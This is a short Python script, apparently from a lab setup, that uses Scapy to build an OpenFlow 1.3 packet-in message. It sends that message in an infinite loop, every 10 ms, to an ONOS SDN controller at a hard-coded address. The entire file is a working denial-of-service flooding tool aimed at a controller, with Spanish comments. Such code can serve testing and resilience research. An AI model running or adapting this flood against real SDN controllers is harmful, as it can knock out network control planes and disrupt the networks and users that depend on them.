from scapy.all import *
from scapy.contrib.openflow import *

def send_packet_in_flood(controller_ip, controller_port, iface):
    # Crear el mensaje OpenFlow packet-in
    packet_in = OFPTPacketIn(
        version=0x04,       # OpenFlow 1.3
        type=0x0a,          # Type 10 for packet-in
        xid=0,              # Transaction ID
        buffer_id=4294967295,  # No buffer
        total_len=100,      # Longitud total del paquete
        in_port=1,          # Puerto de entrada
        reason=0,           # No match
        data=Raw(b'\x00' * 100)  # Datos arbitrarios (100 bytes de ceros)
    )

    # Crear el paquete Ethernet que contiene el mensaje OpenFlow packet-in
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst=controller_ip) / TCP(dport=controller_port) / packet_in

    # Enviar paquetes en un bucle infinito
    while True:
        sendp(packet, iface=iface)
        time.sleep(0.01)  # Controlar la tasa de envío de paquetes (10ms entre cada paquete)


if __name__ == "__main__":
    controller_ip = "172.17.0.2"  # IP del controlador ONOS
    controller_port = 6633         # Puerto del controlador OpenFlow
    iface = "eth0"              # Cambia "s1-eth1" a la interfaz del switch
    send_packet_in_flood(controller_ip, controller_port, iface)
